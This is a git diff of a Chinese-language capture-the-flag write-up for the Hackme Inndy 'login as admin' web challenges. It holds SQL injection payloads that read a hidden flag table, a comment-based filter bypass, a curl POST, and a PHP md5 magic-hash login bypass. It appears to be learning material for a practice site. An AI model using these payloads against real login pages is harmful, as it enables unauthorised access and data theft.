@@ -1,4 +1,4 @@
-[Hackme Inndy CTF](htts://hackme.inndy.tw)
+Hackme Inndy CTF
 ===
 
 參賽者：Will
@@ -141,7 +141,6 @@ password = 1
 ```
 
 
-
 ### 0x08 login as admin 0.1
 #### https://hackme.inndy.tw/login0/
 **Payload 1:** 2 會有反應
@@ -172,12 +171,13 @@ username = \' union select 1,(select COLUMN_NAME from information_schema.COLUMNS
 password = 1
 ```
 
-**Payload 4:** 得到 flag
+**Payload 5:** 得到 flag
 
 ```
 username = \' union select 1,(select the_f14g from h1dden_f14g limit 0,1),3,4#
 password = 1
 ```
+
 
 
 ### 0x09 login as admin 1
@@ -203,4 +203,52 @@ function safe_filter($str)
 ```
 username = \'/**/||1/**/limit/**/1,1#
 password = 1
+```
+
+### 0x10 login as admin 1.2 
+#### https://hackme.inndy.tw/login1/
+
+### 0x11 login as admin 3
+#### https://hackme.inndy.tw/login3/
+
+### 0x12 login as admin 4
+#### https://hackme.inndy.tw/login4/
+
+<弱邏輯>只要 name 是 admin 就會印出 flag
+
+``` html 
+<?php if($_POST['name'] === 'admin'): /* login success! */ ?>
+            <div class="alert alert-success"><code><?=$flag?></code></div>
+```
+
+**Payload:**
+
+`curl -d "name=admin" https://hackme.inndy.tw/login4/`
+
+
+
+### 0x13 login as admin 6
+
+
+### 0x14 login as admin 7
+#### https://hackme.inndy.tw/login7/
+
+在 php 裡 `==` 是比較運算且密碼是使用 md5 加密, 只要找到加密結果是 0e 開頭和後面全是數字的結果即可通過。
+
+``` html
+if($_POST['name'] == 'admin' && md5($_POST['password']) == '00000000000000000000000000000000') {
+    // admin account is disabled by give a impossible md5 hash
+    $user = 'admin';
+} elseif($_POST['name'] == 'guest' && md5($_POST['password']) == '084e0343a0486ff05530df6c705c8bb4') {
+    $user = 'guest';
+} elseif(isset($_POST['name'])) {
+    $user = false;
+}
+```
+
+
+**Payload:**
+``` sh
+username = admin
+password = QNKCDZO
 ```
